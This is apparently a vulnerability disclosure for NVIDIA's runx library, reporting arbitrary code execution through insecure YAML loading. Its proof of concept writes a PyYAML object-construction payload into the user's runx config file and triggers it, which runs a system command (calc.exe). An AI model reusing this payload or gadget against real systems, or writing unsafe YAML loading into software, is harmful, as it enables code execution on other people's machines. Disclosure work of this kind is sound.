# Description

**runx** is a Deep Learning Experiment Management library by NVIDIA.
This package was vulnerable to Arbitrary code execution via Insecure YAML deserialization due to the use of a known vulnerable function **load()** in **yaml**. <br>
repo: https://github.com/NVIDIA/runx

# Proof of Concept

```python
#!/usr/bin/env python3

import runx.utils as runx
import os

payload = '''
!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('calc.exe')"
'''

# create payload file in ~/.config/runx.yml
if not (os.path.isdir(os.environ['HOME'] + '/.config')):
    os.mkdir(os.environ['HOME'] + '/.config')
open(os.environ['HOME'] + '/.config/runx.yml', 'w+').write(payload)

runx.read_config_file()

print("pwned! 🏴")
```

* `pip3 install runx`
* `python3 exploit.py`
